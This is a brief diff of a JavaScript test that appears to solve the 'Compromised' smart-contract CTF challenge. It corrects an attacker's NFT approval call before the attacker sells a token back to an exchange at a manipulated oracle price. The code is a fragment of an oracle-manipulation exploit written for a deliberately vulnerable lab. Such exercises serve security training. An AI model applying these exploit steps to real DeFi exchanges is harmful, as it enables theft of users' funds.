@@ -98,7 +98,7 @@ describe('Compromised challenge', function () {
         }
         const dumpPrice = await this.oracle.getMedianPrice(tokenSymbol)
 		console.log("dump price",dumpPrice.toString())
-		await this.exchange.connect(attacker).approve(tokenId);
+		await this.token.connect(attacker).approve(this.exchange.address,tokenId);
 		await this.exchange.connect(attacker).sellOne(tokenId);
         console.log("export")
  
